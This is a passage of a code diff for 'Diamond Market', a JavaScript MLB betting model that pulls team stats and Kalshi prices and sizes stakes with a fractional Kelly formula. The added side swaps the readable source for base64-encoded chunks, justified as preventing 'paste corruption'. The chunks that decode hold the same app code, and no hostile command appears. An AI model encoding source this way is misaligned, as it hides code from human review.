@@ -1,756 +1,1392 @@
-// – CONSTANTS —————————————————————–
-var PARK = {‘Arizona Diamondbacks’:101,‘Atlanta Braves’:100,‘Baltimore Orioles’:100,‘Boston Red Sox’:104,‘Chicago Cubs’:103,‘Chicago White Sox’:100,‘Cincinnati Reds’:105,‘Cleveland Guardians’:99,‘Colorado Rockies’:115,‘Detroit Tigers’:97,‘Houston Astros’:102,‘Kansas City Royals’:99,‘Los Angeles Angels’:98,‘Los Angeles Dodgers’:98,‘Miami Marlins’:97,‘Milwaukee Brewers’:100,‘Minnesota Twins’:99,‘New York Mets’:98,‘New York Yankees’:102,‘Oakland Athletics’:97,‘Philadelphia Phillies’:103,‘Pittsburgh Pirates’:97,‘San Diego Padres’:96,‘San Francisco Giants’:97,‘Seattle Mariners’:96,‘St. Louis Cardinals’:98,‘Tampa Bay Rays’:97,‘Texas Rangers’:103,‘Toronto Blue Jays’:102,‘Washington Nationals’:99};
-var ABBR = {‘Arizona Diamondbacks’:‘ARI’,‘Atlanta Braves’:‘ATL’,‘Baltimore Orioles’:‘BAL’,‘Boston Red Sox’:‘BOS’,‘Chicago Cubs’:‘CHC’,‘Chicago White Sox’:‘CWS’,‘Cincinnati Reds’:‘CIN’,‘Cleveland Guardians’:‘CLE’,‘Colorado Rockies’:‘COL’,‘Detroit Tigers’:‘DET’,‘Houston Astros’:‘HOU’,‘Kansas City Royals’:‘KC’,‘Los Angeles Angels’:‘LAA’,‘Los Angeles Dodgers’:‘LAD’,‘Miami Marlins’:‘MIA’,‘Milwaukee Brewers’:‘MIL’,‘Minnesota Twins’:‘MIN’,‘New York Mets’:‘NYM’,‘New York Yankees’:‘NYY’,‘Oakland Athletics’:‘OAK’,‘Philadelphia Phillies’:‘PHI’,‘Pittsburgh Pirates’:‘PIT’,‘San Diego Padres’:‘SD’,‘San Francisco Giants’:‘SF’,‘Seattle Mariners’:‘SEA’,‘St. Louis Cardinals’:‘STL’,‘Tampa Bay Rays’:‘TB’,‘Texas Rangers’:‘TEX’,‘Toronto Blue Jays’:‘TOR’,‘Washington Nationals’:‘WSH’};
-var AVG_SP={era:4.20,whip:1.30,k9:8.8,bb9:3.2,fip:4.05,xfip:4.00,ipsPerStart:5.0};
-var AVG_HIT={ba:0.250,obp:0.320,slg:0.415,woba:0.315,babip:0.295};
-var AVG_PITCH={teamEra:4.20,teamWhip:1.28,teamK9:8.5,teamFip:4.05,saves:25,holds:45,blownSaves:10};
-var AVG_DEF={fieldingPct:0.983,errors:80};
-var AVG_STAND={rdiff:0,pct:0.500};
-var MLB_API=‘https://statsapi.mlb.com/api/v1’;
-var KALSHI_API=‘https://external-api.kalshi.com/trade-api/v2’;
-
-// – STATE ———————————————————————
-function ls(k){try{return JSON.parse(localStorage.getItem(k));}catch(e){return null;}}
-function lsSet(k,v){try{localStorage.setItem(k,JSON.stringify(v));}catch(e){}}
-function today(){return new Date().toISOString().slice(0,10);}
-function daysAgo(n){var d=new Date();d.setDate(d.getDate()-n);return d.toISOString().slice(0,10);}
-var S;
-try {
-S={
-date:ls(‘dm-date’)||today(),bankroll:ls(‘dm-bankroll’)||1000,
-bookOdds:ls(‘dm-bookodds’)||{},minEdge:ls(‘dm-minedge’)||2,
-btStart:ls(‘dm-btstart’)||daysAgo(30),btEnd:ls(‘dm-btend’)||daysAgo(1),
-results:[],detail:null,parlays:null,
-loading:false,progress:’’,error:’’,
-btResults:null,btLoading:false,btProgress:’’,btError:’’
-};
-} catch(e) {
-// S init failed - use safe defaults
-S={date:today(),bankroll:1000,bookOdds:{},minEdge:2,btStart:daysAgo(30),btEnd:daysAgo(1),results:[],detail:null,parlays:null,loading:false,progress:’’,error:‘S_INIT_FAILED:’+e.message,btResults:null,btLoading:false,btProgress:’’,btError:’’};
-}
-function sSet(k,v){S[k]=v;lsSet(‘dm-’+k,v);}
-
-// – MLB API —————————————————————––
-function mlbGet(path){return fetch(MLB_API+path).then(function(r){if(!r.ok)throw new Error(’HTTP ’+r.status);return r.json();});}
-
-function fetchGames(date){
-return mlbGet(’/schedule?sportId=1&date=’+date+’&hydrate=probablePitcher,team,venue,weather’).then(function(d){
-if(!d.dates||!d.dates.length)return[];
-return d.dates[0].games.map(function(g){
-var w=g.weather;
-var wx=w&&w.temp?w.temp+‘F’+(w.condition?’, ‘+w.condition:’’)+(w.wind?’, wind ‘+w.wind:’’):null;
-return{gamePk:g.gamePk,venue:(g.venue&&g.venue.name)||’’,
-time:g.gameDate?new Date(g.gameDate).toLocaleTimeString([],{hour:‘2-digit’,minute:‘2-digit’}):’’,weather:wx,
-away:{id:g.teams.away.team.id,name:g.teams.away.team.name,pitcherId:(g.teams.away.probablePitcher&&g.teams.away.probablePitcher.id)||null,pitcherName:(g.teams.away.probablePitcher&&g.teams.away.probablePitcher.fullName)||‘TBD’},
-home:{id:g.teams.home.team.id,name:g.teams.home.team.name,pitcherId:(g.teams.home.probablePitcher&&g.teams.home.probablePitcher.id)||null,pitcherName:(g.teams.home.probablePitcher&&g.teams.home.probablePitcher.fullName)||‘TBD’}};
-});
-});
-}
-function fetchSP(pid,yr){
-if(!pid)return Promise.resolve(null);
-return mlbGet(’/people/’+pid+’/stats?stats=season&group=pitching&season=’+yr).then(function(d){
-var s=d.stats&&d.stats[0]&&d.stats[0].splits&&d.stats[0].splits[0]?d.stats[0].splits[0].stat:null;
-if(!s)return null;
-var ip=parseFloat(s.inningsPitched)||0,hr=parseInt(s.homeRuns)||0,bb=parseInt(s.baseOnBalls)||0,hbp=parseInt(s.hitByPitch)||0,k=parseInt(s.strikeOuts)||0,gs=parseInt(s.gamesStarted)||1;
-var fip=ip>0?((13*hr)+3*(bb+hbp)-(2*k))/ip+3.15:null;
-var xfip=ip>0?((13*(1.25*ip/9))+3*(bb+hbp)-(2*k))/ip+3.15:null;
-return{era:parseFloat(s.era)||4.50,whip:parseFloat(s.whip)||1.35,k9:parseFloat(s.strikeoutsPer9Inn)||8.5,bb9:parseFloat(s.walksPer9Inn)||3.2,fip:fip||parseFloat(s.era)*0.95||4.30,xfip:xfip||parseFloat(s.era)*0.93||4.20,ipsPerStart:ip/gs};
-}).catch(function(){return null;});
-}
-function fetchHit(id,yr){
-var woba=null,babip=null;
-return mlbGet(’/teams/’+id+’/stats?stats=sabermetrics&group=hitting&season=’+yr).then(function(ds){
-var ss=ds.stats&&ds.stats[0]&&ds.stats[0].splits&&ds.stats[0].splits[0]?ds.stats[0].splits[0].stat:null;
-if(ss){woba=parseFloat(ss.wOBA);babip=parseFloat(ss.babip);}
-}).catch(function(){}).then(function(){
-return mlbGet(’/teams/’+id+’/stats?stats=season&group=hitting&season=’+yr);
-}).then(function(d){
-var s=d.stats&&d.stats[0]&&d.stats[0].splits&&d.stats[0].splits[0]?d.stats[0].splits[0].stat:null;
-if(!s)return null;
-var obp=parseFloat(s.obp)||0.320,slg=parseFloat(s.slg)||0.410;
-if(!woba||isNaN(woba))woba=(obp*1.15+slg*0.62)/1.77;
-if(!babip||isNaN(babip))babip=parseFloat(s.babip)||0.295;
-return{ba:parseFloat(s.avg)||0.250,obp:obp,slg:slg,woba:woba,babip:babip};
-}).catch(function(){return null;});
-}
-function fetchPit(id,yr){
-return mlbGet(’/teams/’+id+’/stats?stats=season&group=pitching&season=’+yr).then(function(d){
-var s=d.stats&&d.stats[0]&&d.stats[0].splits&&d.stats[0].splits[0]?d.stats[0].splits[0].stat:null;
-if(!s)return null;
-var ip=parseFloat(s.inningsPitched)||1000,hr=parseInt(s.homeRuns)||150,bb=parseInt(s.baseOnBalls)||450,hbp=parseInt(s.hitByPitch)||60,k=parseInt(s.strikeOuts)||1200;
-var fip=ip>0?((13*hr)+3*(bb+hbp)-(2*k))/ip+3.15:4.05;
-return{teamEra:parseFloat(s.era)||4.20,teamWhip:parseFloat(s.whip)||1.28,teamK9:parseFloat(s.strikeoutsPer9Inn)||8.5,teamFip:fip,saves:parseInt(s.saves)||25,holds:parseInt(s.holds)||45,blownSaves:parseInt(s.blownSaves)||10};
-}).catch(function(){return null;});
-}
-function fetchDef(id,yr){
-return mlbGet(’/teams/’+id+’/stats?stats=season&group=fielding&season=’+yr).then(function(d){
-var s=d.stats&&d.stats[0]&&d.stats[0].splits&&d.stats[0].splits[0]?d.stats[0].splits[0].stat:null;
-if(!s)return null;
-return{fieldingPct:parseFloat(s.fielding)||0.983,errors:parseInt(s.errors)||80};
-}).catch(function(){return null;});
-}
-function fetchRecent(id,date){
-return mlbGet(’/schedule?teamId=’+id+’&startDate=’+daysAgo(20)+’&endDate=’+date+’&sportId=1’).then(function(d){
-var games=(d.dates||[]).reduce(function(a,x){return a.concat(x.games);},[]).filter(function(g){return g.status&&g.status.abstractGameState===‘Final’;}).slice(-10);
-if(!games.length)return{winPct:0.500};
-var wins=games.filter(function(g){return g.teams.home.team.id===id?g.teams.home.isWinner:g.teams.away.isWinner;}).length;
-return{winPct:wins/games.length};
-}).catch(function(){return{winPct:0.500};});
-}
-function fetchStand(id,yr){
-return mlbGet(’/standings?leagueId=103,104&season=’+yr+’&hydrate=team’).then(function(d){
-for(var i=0;i<(d.records||[]).length;i++){
-for(var j=0;j<(d.records[i].teamRecords||[]).length;j++){
-var tr=d.records[i].teamRecords[j];
-if(tr.team.id===id)return{rdiff:(tr.runsScored||0)-(tr.runsAllowed||0),pct:parseFloat(tr.winningPercentage)||0.500};
-}
-}
-return{rdiff:0,pct:0.500};
-}).catch(function(){return{rdiff:0,pct:0.500};});
-}
-function fetchH2H(awayId,homeId,yr){
-return mlbGet(’/schedule?sportId=1&season=’+yr+’&teamId=’+awayId+’&opponentId=’+homeId).then(function(d){
-var games=(d.dates||[]).reduce(function(a,x){return a.concat(x.games);},[]).filter(function(g){return g.status&&g.status.abstractGameState===‘Final’;});
-if(games.length<3)return null;
-var aw=games.filter(function(g){return(g.teams.away.team.id===awayId&&g.teams.away.isWinner)||(g.teams.home.team.id===awayId&&g.teams.home.isWinner);}).length;
-return{awayWins:aw,total:games.length,awayPct:aw/games.length};
-}).catch(function(){return null;});
-}
-function fetchCompleted(start,end){
-return mlbGet(’/schedule?sportId=1&startDate=’+start+’&endDate=’+end+’&hydrate=probablePitcher,team,decisions’).then(function(d){
-return(d.dates||[]).reduce(function(a,x){return a.concat(x.games);},[]).filter(function(g){return g.status&&g.status.abstractGameState===‘Final’;}).map(function(g){
-return{gamePk:g.gamePk,date:(g.officialDate||g.gameDate||’’).slice(0,10),
-away:{id:g.teams.away.team.id,name:g.teams.away.team.name,pitcherId:(g.teams.away.probablePitcher&&g.teams.away.probablePitcher.id)||null,pitcherName:(g.teams.away.probablePitcher&&g.teams.away.probablePitcher.fullName)||‘TBD’},
-home:{id:g.teams.home.team.id,name:g.teams.home.team.name,pitcherId:(g.teams.home.probablePitcher&&g.teams.home.probablePitcher.id)||null,pitcherName:(g.teams.home.probablePitcher&&g.teams.home.probablePitcher.fullName)||‘TBD’},
-actualWinner:g.teams.home.isWinner?g.teams.home.team.name:g.teams.away.isWinner?g.teams.away.team.name:null};
-}).filter(function(g){return g.actualWinner;});
-});
-}
-var _cache={};
-function cachedStats(id,yr){
-var k=id+’-’+yr;
-if(_cache[k])return Promise.resolve(_cache[k]);
-return Promise.all([fetchHit(id,yr),fetchPit(id,yr),fetchDef(id,yr),fetchStand(id,yr)]).then(function(r){
-_cache[k]={hit:r[0]||AVG_HIT,pit:r[1],def:r[2]||AVG_DEF,stand:r[3]||AVG_STAND};
-return _cache[k];
-});
-}
-
-// – KALSHI API ––––––––––––––––––––––––––––––––
-function priceToML(p){
-p=parseFloat(p);
-if(!p||isNaN(p)||p<=0||p>=1)return null;
-if(p>=0.5)return’-’+Math.round(p/(1-p)*100);
-return’+’+Math.round((1-p)/p*100);
-}
-function fetchKalshiOdds(results){
-return fetch(KALSHI_API+’/events?series_ticker=KXMLBGAME&status=open&limit=200’).then(function(r){
-if(!r.ok)throw new Error(‘HTTP ‘+r.status);
-return r.json();
-}).then(function(d){
-var events=d.events||[];
-var odds={};
-var promises=[];
-results.forEach(function(game){
-var awayAbbr=(ABBR[game.aName]||’’).toUpperCase();
-var homeAbbr=(ABBR[game.bName]||’’).toUpperCase();
-if(!awayAbbr||!homeAbbr)return;
-var matched=null;
-for(var i=0;i<events.length;i++){
-var t=(events[i].event_ticker||’’).toUpperCase();
-if(t.includes(awayAbbr)&&t.includes(homeAbbr)){matched=events[i];break;}
-}
-if(!matched)return;
-var gpk=game.gamePk;
-var winnerNick=game.winner.split(’ ‘).pop().toLowerCase();
-var winnerAbbr=(ABBR[game.winner]||’’).toUpperCase();
-promises.push(
-fetch(KALSHI_API+’/markets?event_ticker=’+matched.event_ticker+’&status=open’).then(function(r){return r.json();}).then(function(md){
-(md.markets||[]).forEach(function(mkt){
-var sub=(mkt.yes_sub_title||mkt.title||’’).toLowerCase();
-var tkr=(mkt.ticker||’’).toUpperCase();
-if(sub.includes(winnerNick)||tkr.includes(winnerAbbr)){
-var bid=parseFloat(mkt.yes_bid_dollars)||0;
-var ask=parseFloat(mkt.yes_ask_dollars)||0;
-var price=(bid&&ask)?(bid+ask)/2:bid||ask||parseFloat(mkt.last_price_dollars)||0;
-var ml=priceToML(price);
-if(ml)odds[gpk]=ml;
-}
-});
-}).catch(function(){})
-);
-});
-return Promise.all(promises).then(function(){return odds;});
-}).catch(function(){return{};});
-}
-
-// – MODEL ———————————————————————
-function clamp(v,lo,hi){return Math.max(lo,Math.min(hi,v));}
-function sigmoid(x){return 1/(1+Math.exp(-x));}
-function mlDec(ml){var n=parseInt(ml);return n>0?(n/100)+1:(100/Math.abs(n))+1;}
-function mlImp(ml){if(!ml)return null;var n=parseInt(ml);if(isNaN(n))return null;return n>0?100/(n+100):Math.abs(n)/(Math.abs(n)+100);}
-function edge(p,bml){var bp=mlImp(bml);return bp!==null?p-bp:null;}
-function kelly(p,ml,f){f=f||0.25;var b=mlDec(ml)-1,q=1-p;return Math.max(0,((b*p-q)/b)*f);}
-function blendPitch(sp,tp){
-var S=sp||AVG_SP,T=tp||AVG_PITCH;
-var si=clamp(S.ipsPerStart||5.0,3.5,7.0),bi=9-si;
-var bpEra=clamp((T.teamEra*9-S.era*si)/bi,2.5,7.5);
-var bpWhip=clamp((T.teamWhip*9-S.whip*si)/bi,0.9,2.2);
-var bpK9=clamp((T.teamK9*9-S.k9*si)/bi,5.0,14.0);
-var bpFip=clamp((T.teamFip*9-S.fip*si)/bi,2.5,7.5);
-var bsv=T.saves+T.blownSaves;
-return{spInn:si,bpInn:bi,starterEra:S.era,starterWhip:S.whip,starterK9:S.k9,starterFip:S.fip,starterXfip:S.xfip,starterBb9:S.bb9,bullpenEra:bpEra,bullpenWhip:bpWhip,bullpenFip:bpFip,
-blendedEra:(S.era*si+bpEra*bi)/9,blendedWhip:(S.whip*si+bpWhip*bi)/9,blendedK9:(S.k9*si+bpK9*bi)/9,blendedFip:(S.fip*si+bpFip*bi)/9,
-bullpenDepth:(T.saves+T.holds)/70,svPct:bsv>0?T.saves/bsv:0.70};
-}
-function runModel(A,B,h2h){
-var pfB=(PARK[B.name]||100)/100,pfA=(PARK[A.name]||100)/100;
-var aW=(A.hit.woba/pfA)*pfB,bW=(B.hit.woba/pfA)*pfB;
-var aL=(A.hit.babip-0.295)*0.5,bL=(B.hit.babip-0.295)*0.5;
-var aD=(A.def.fieldingPct-0.983)*50-(A.def.errors-80)*0.003;
-var bD=(B.def.fieldingPct-0.983)*50-(B.def.errors-80)*0.003;
-var aBP=(A.pitch.svPct-0.70)*0.3,bBP=(B.pitch.svPct-0.70)*0.3;
-var lo=0;
-lo+=(B.pitch.blendedFip-A.pitch.blendedFip)*0.24;
-lo+=(B.pitch.blendedWhip-A.pitch.blendedWhip)*0.20;
-lo+=(A.pitch.blendedK9-B.pitch.blendedK9)*0.04;
-lo+=(A.pitch.starterBb9-B.pitch.starterBb9)*0.06;
-lo+=aBP-bBP;
-lo+=(A.pitch.bullpenDepth-B.pitch.bullpenDepth)*0.10;
-lo+=(aW-bW)*4.2;
-lo+=(A.hit.slg-B.hit.slg)*0.8;
-lo-=(aL-bL);
-lo+=(aD-bD)*0.08;
-lo-=0.16;
-lo+=(A.stand.rdiff-B.stand.rdiff)*0.005;
-lo+=(A.recent.winPct-B.recent.winPct)*0.50;
-lo+=(A.stand.pct-B.stand.pct)*0.30;
-if(h2h&&h2h.total>=3)lo+=(h2h.awayPct-0.500)*0.20;
-lo+=((PARK[B.name]||100)-100)*0.004;
-var pA=clamp(sigmoid(lo),0.22,0.78),pB=1-pA;
-function ml(p){return p>=0.5?’-’+Math.round(p/(1-p)*100):’+’+Math.round((1-p)/p*100);}
-var rA=Math.max(1,Math.round(aW*14-B.pitch.blendedFip*0.30));
-var rB=Math.max(1,Math.round(bW*14-A.pitch.blendedFip*0.30));
-var winner=pA>=pB?A.name:B.name;
-var factors=[
-{label:‘Blended FIP’,aVal:A.pitch.blendedFip.toFixed(2),bVal:B.pitch.blendedFip.toFixed(2),delta:(B.pitch.blendedFip-A.pitch.blendedFip)*0.24},
-{label:‘Blended WHIP’,aVal:A.pitch.blendedWhip.toFixed(2),bVal:B.pitch.blendedWhip.toFixed(2),delta:(B.pitch.blendedWhip-A.pitch.blendedWhip)*0.20},
-{label:‘BB/9’,aVal:A.pitch.starterBb9.toFixed(1),bVal:B.pitch.starterBb9.toFixed(1),delta:(A.pitch.starterBb9-B.pitch.starterBb9)*0.06},
-{label:‘K/9’,aVal:A.pitch.blendedK9.toFixed(1),bVal:B.pitch.blendedK9.toFixed(1),delta:(A.pitch.blendedK9-B.pitch.blendedK9)*0.04},
-{label:‘Bullpen Depth’,aVal:’’+Math.round(A.pitch.bullpenDepth*70),bVal:’’+Math.round(B.pitch.bullpenDepth*70),delta:(A.pitch.bullpenDepth-B.pitch.bullpenDepth)*0.10},
-{label:‘Save %’,aVal:(A.pitch.svPct*100).toFixed(0)+’%’,bVal:(B.pitch.svPct*100).toFixed(0)+’%’,delta:aBP-bBP},
-{label:‘wOBA (park-adj)’,aVal:aW.toFixed(3),bVal:bW.toFixed(3),delta:(aW-bW)*4.2},
-{label:‘Team SLG’,aVal:A.hit.slg.toFixed(3),bVal:B.hit.slg.toFixed(3),delta:(A.hit.slg-B.hit.slg)*0.8},
-{label:‘BABIP luck’,aVal:A.hit.babip.toFixed(3),bVal:B.hit.babip.toFixed(3),delta:-(aL-bL)},
-{label:‘Home Field’,aVal:‘Away’,bVal:‘Home’,delta:-0.16},
-{label:‘Park Factor’,aVal:’’+(PARK[A.name]||100),bVal:(PARK[B.name]||100)+’ (home)’,delta:((PARK[B.name]||100)-100)*0.004},
-{label:‘Season Win%’,aVal:((A.stand.pct*1000)|0)/10+’%’,bVal:((B.stand.pct*1000)|0)/10+’%’,delta:(A.stand.pct-B.stand.pct)*0.30},
-{label:‘Recent L10’,aVal:Math.round(A.recent.winPct*10)+’-’+Math.round((1-A.recent.winPct)*10),bVal:Math.round(B.recent.winPct*10)+’-’+Math.round((1-B.recent.winPct)*10),delta:(A.recent.winPct-B.recent.winPct)*0.50},
-{label:‘Run Diff’,aVal:(A.stand.rdiff>=0?’+’:’’)+A.stand.rdiff,bVal:(B.stand.rdiff>=0?’+’:’’)+B.stand.rdiff,delta:(A.stand.rdiff-B.stand.rdiff)*0.005}
+// Diamond Market - safe encoding prevents paste corruption
+var _p=[
+`dmFyIFBBUks9eydBcml6b25hIERpYW1vbmRiYWNrcyc6MTAxLCdBdGxhbnRh`,
+`IEJyYXZlcyc6MTAwLCdCYWx0aW1vcmUgT3Jpb2xlcyc6MTAwLCdCb3N0b24g`,
+`UmVkIFNveCc6MTA0LCdDaGljYWdvIEN1YnMnOjEwMywnQ2hpY2FnbyBXaGl0`,
+`ZSBTb3gnOjEwMCwnQ2luY2lubmF0aSBSZWRzJzoxMDUsJ0NsZXZlbGFuZCBH`,
+`dWFyZGlhbnMnOjk5LCdDb2xvcmFkbyBSb2NraWVzJzoxMTUsJ0RldHJvaXQg`,
+`VGlnZXJzJzo5NywnSG91c3RvbiBBc3Ryb3MnOjEwMiwnS2Fuc2FzIENpdHkg`,
+`Um95YWxzJzo5OSwnTG9zIEFuZ2VsZXMgQW5nZWxzJzo5OCwnTG9zIEFuZ2Vs`,
+`ZXMgRG9kZ2Vycyc6OTgsJ01pYW1pIE1hcmxpbnMnOjk3LCdNaWx3YXVrZWUg`,
+`QnJld2Vycyc6MTAwLCdNaW5uZXNvdGEgVHdpbnMnOjk5LCdOZXcgWW9yayBN`,
+`ZXRzJzo5OCwnTmV3IFlvcmsgWWFua2Vlcyc6MTAyLCdPYWtsYW5kIEF0aGxl`,
+`dGljcyc6OTcsJ1BoaWxhZGVscGhpYSBQaGlsbGllcyc6MTAzLCdQaXR0c2J1`,
+`cmdoIFBpcmF0ZXMnOjk3LCdTYW4gRGllZ28gUGFkcmVzJzo5NiwnU2FuIEZy`,
+`YW5jaXNjbyBHaWFudHMnOjk3LCdTZWF0dGxlIE1hcmluZXJzJzo5NiwnU3Qu`,
+`IExvdWlzIENhcmRpbmFscyc6OTgsJ1RhbXBhIEJheSBSYXlzJzo5NywnVGV4`,
+`YXMgUmFuZ2Vycyc6MTAzLCdUb3JvbnRvIEJsdWUgSmF5cyc6MTAyLCdXYXNo`,
+`aW5ndG9uIE5hdGlvbmFscyc6OTl9Owp2YXIgQUJCUj17J0FyaXpvbmEgRGlh`,
+`bW9uZGJhY2tzJzonQVJJJywnQXRsYW50YSBCcmF2ZXMnOidBVEwnLCdCYWx0`,
+`aW1vcmUgT3Jpb2xlcyc6J0JBTCcsJ0Jvc3RvbiBSZWQgU294JzonQk9TJywn`,
+`Q2hpY2FnbyBDdWJzJzonQ0hDJywnQ2hpY2FnbyBXaGl0ZSBTb3gnOidDV1Mn`,
+`LCdDaW5jaW5uYXRpIFJlZHMnOidDSU4nLCdDbGV2ZWxhbmQgR3VhcmRpYW5z`,
+`JzonQ0xFJywnQ29sb3JhZG8gUm9ja2llcyc6J0NPTCcsJ0RldHJvaXQgVGln`,
+`ZXJzJzonREVUJywnSG91c3RvbiBBc3Ryb3MnOidIT1UnLCdLYW5zYXMgQ2l0`,
+`eSBSb3lhbHMnOidLQycsJ0xvcyBBbmdlbGVzIEFuZ2Vscyc6J0xBQScsJ0xv`,
+`cyBBbmdlbGVzIERvZGdlcnMnOidMQUQnLCdNaWFtaSBNYXJsaW5zJzonTUlB`,
+`JywnTWlsd2F1a2VlIEJyZXdlcnMnOidNSUwnLCdNaW5uZXNvdGEgVHdpbnMn`,
+`OidNSU4nLCdOZXcgWW9yayBNZXRzJzonTllNJywnTmV3IFlvcmsgWWFua2Vl`,
+`cyc6J05ZWScsJ09ha2xhbmQgQXRobGV0aWNzJzonT0FLJywnUGhpbGFkZWxw`,
+`aGlhIFBoaWxsaWVzJzonUEhJJywnUGl0dHNidXJnaCBQaXJhdGVzJzonUElU`,
+`JywnU2FuIERpZWdvIFBhZHJlcyc6J1NEJywnU2FuIEZyYW5jaXNjbyBHaWFu`,
+`dHMnOidTRicsJ1NlYXR0bGUgTWFyaW5lcnMnOidTRUEnLCdTdC4gTG91aXMg`,
+`Q2FyZGluYWxzJzonU1RMJywnVGFtcGEgQmF5IFJheXMnOidUQicsJ1RleGFz`,
+`IFJhbmdlcnMnOidURVgnLCdUb3JvbnRvIEJsdWUgSmF5cyc6J1RPUicsJ1dh`,
+`c2hpbmd0b24gTmF0aW9uYWxzJzonV1NIJ307CnZhciBBVkdfU1A9e2VyYTo0`,
+`LjIwLHdoaXA6MS4zMCxrOTo4LjgsYmI5OjMuMixmaXA6NC4wNSx4ZmlwOjQu`,
+`MDAsaXBzUGVyU3RhcnQ6NS4wfTsKdmFyIEFWR19ISVQ9e2JhOjAuMjUwLG9i`,
+`cDowLjMyMCxzbGc6MC40MTUsd29iYTowLjMxNSxiYWJpcDowLjI5NX07CnZh`,
+`ciBBVkdfUElUQ0g9e3RlYW1FcmE6NC4yMCx0ZWFtV2hpcDoxLjI4LHRlYW1L`,
+`OTo4LjUsdGVhbUZpcDo0LjA1LHNhdmVzOjI1LGhvbGRzOjQ1LGJsb3duU2F2`,
+`ZXM6MTB9Owp2YXIgQVZHX0RFRj17ZmllbGRpbmdQY3Q6MC45ODMsZXJyb3Jz`,
+`OjgwfTsKdmFyIEFWR19TVEFORD17cmRpZmY6MCxwY3Q6MC41MDB9Owp2YXIg`,
+`TUxCX0FQST0naHR0cHM6Ly9zdGF0c2FwaS5tbGIuY29tL2FwaS92MSc7CnZh`,
+`ciBLQUxTSElfQVBJPSdodHRwczovL2V4dGVybmFsLWFwaS5rYWxzaGkuY29t`,
+`L3RyYWRlLWFwaS92Mic7CmZ1bmN0aW9uIGxzKGspe3RyeXtyZXR1cm4gSlNP`,
+`Ti5wYXJzZShsb2NhbFN0b3JhZ2UuZ2V0SXRlbShrKSk7fWNhdGNoKGUpe3Jl`,
+`dHVybiBudWxsO319CmZ1bmN0aW9uIGxzU2V0KGssdil7dHJ5e2xvY2FsU3Rv`,
+`cmFnZS5zZXRJdGVtKGssSlNPTi5zdHJpbmdpZnkodikpO31jYXRjaChlKXt9`,
+`fQpmdW5jdGlvbiB0b2RheSgpe3JldHVybiBuZXcgRGF0ZSgpLnRvSVNPU3Ry`,
+`aW5nKCkuc2xpY2UoMCwxMCk7fQpmdW5jdGlvbiBkYXlzQWdvKG4pe3ZhciBk`,
+`PW5ldyBEYXRlKCk7ZC5zZXREYXRlKGQuZ2V0RGF0ZSgpLW4pO3JldHVybiBk`,
+`LnRvSVNPU3RyaW5nKCkuc2xpY2UoMCwxMCk7fQp2YXIgUzsKdHJ5e1M9e2Rh`,
+`dGU6bHMoJ2RtLWRhdGUnKXx8dG9kYXkoKSxiYW5rcm9sbDpscygnZG0tYmFu`,
+`a3JvbGwnKXx8MTAwMCxib29rT2RkczpscygnZG0tYm9va29kZHMnKXx8e30s`,
+`bWluRWRnZTpscygnZG0tbWluZWRnZScpfHwyLGJ0U3RhcnQ6bHMoJ2RtLWJ0`,
+`c3RhcnQnKXx8ZGF5c0FnbygzMCksYnRFbmQ6bHMoJ2RtLWJ0ZW5kJyl8fGRh`,
+`eXNBZ28oMSkscmVzdWx0czpbXSxkZXRhaWw6bnVsbCxwYXJsYXlzOm51bGws`,
+`bG9hZGluZzpmYWxzZSxwcm9ncmVzczonJyxlcnJvcjonJyxidFJlc3VsdHM6`,
+`bnVsbCxidExvYWRpbmc6ZmFsc2UsYnRQcm9ncmVzczonJyxidEVycm9yOicn`,
+`fTt9CmNhdGNoKGUpe1M9e2RhdGU6dG9kYXkoKSxiYW5rcm9sbDoxMDAwLGJv`,
+`b2tPZGRzOnt9LG1pbkVkZ2U6MixidFN0YXJ0OmRheXNBZ28oMzApLGJ0RW5k`,
+`OmRheXNBZ28oMSkscmVzdWx0czpbXSxkZXRhaWw6bnVsbCxwYXJsYXlzOm51`,
+`bGwsbG9hZGluZzpmYWxzZSxwcm9ncmVzczonJyxlcnJvcjonJyxidFJlc3Vs`,
+`dHM6bnVsbCxidExvYWRpbmc6ZmFsc2UsYnRQcm9ncmVzczonJyxidEVycm9y`,
+`OicnfTt9CmZ1bmN0aW9uIHNTZXQoayx2KXtTW2tdPXY7bHNTZXQoJ2RtLScr`,
+`ayx2KTt9CmZ1bmN0aW9uIG1sYkdldChwYXRoKXtyZXR1cm4gZmV0Y2goTUxC`,
+`X0FQSStwYXRoKS50aGVuKGZ1bmN0aW9uKHIpe2lmKCFyLm9rKXRocm93IG5l`,
+`dyBFcnJvcignSFRUUCAnK3Iuc3RhdHVzKTtyZXR1cm4gci5qc29uKCk7fSk7`,
+`fQpmdW5jdGlvbiBmZXRjaEdhbWVzKGRhdGUpe3JldHVybiBtbGJHZXQoJy9z`,
+`Y2hlZHVsZT9zcG9ydElkPTEmZGF0ZT0nK2RhdGUrJyZoeWRyYXRlPXByb2Jh`,
+`YmxlUGl0Y2hlcix0ZWFtLHZlbnVlLHdlYXRoZXInKS50aGVuKGZ1bmN0aW9u`,
+`KGQpe2lmKCFkLmRhdGVzfHwhZC5kYXRlcy5sZW5ndGgpcmV0dXJuW107cmV0`,
+`dXJuIGQuZGF0ZXNbMF0uZ2FtZXMubWFwKGZ1bmN0aW9uKGcpe3ZhciB3PWcu`,
+`d2VhdGhlcjt2YXIgd3g9dyYmdy50ZW1wP3cudGVtcCsnRicrKHcuY29uZGl0`,
+`aW9uPycsICcrdy5jb25kaXRpb246JycpKyh3LndpbmQ/Jywgd2luZCAnK3cu`,
+`d2luZDonJyk6bnVsbDtyZXR1cm57Z2FtZVBrOmcuZ2FtZVBrLHZlbnVlOihn`,
+`LnZlbnVlJiZnLnZlbnVlLm5hbWUpfHwnJyx0aW1lOmcuZ2FtZURhdGU/bmV3`,
+`IERhdGUoZy5nYW1lRGF0ZSkudG9Mb2NhbGVUaW1lU3RyaW5nKFtdLHtob3Vy`,
+`OicyLWRpZ2l0JyxtaW51dGU6JzItZGlnaXQnfSk6Jycsd2VhdGhlcjp3eCxh`,
+`d2F5OntpZDpnLnRlYW1zLmF3YXkudGVhbS5pZCxuYW1lOmcudGVhbXMuYXdh`,
+`eS50ZWFtLm5hbWUscGl0Y2hlcklkOihnLnRlYW1zLmF3YXkucHJvYmFibGVQ`,
+`aXRjaGVyJiZnLnRlYW1zLmF3YXkucHJvYmFibGVQaXRjaGVyLmlkKXx8bnVs`,
+`bCxwaXRjaGVyTmFtZTooZy50ZWFtcy5hd2F5LnByb2JhYmxlUGl0Y2hlciYm`,
+`Zy50ZWFtcy5hd2F5LnByb2JhYmxlUGl0Y2hlci5mdWxsTmFtZSl8fCdUQkQn`,
+`fSxob21lOntpZDpnLnRlYW1zLmhvbWUudGVhbS5pZCxuYW1lOmcudGVhbXMu`,
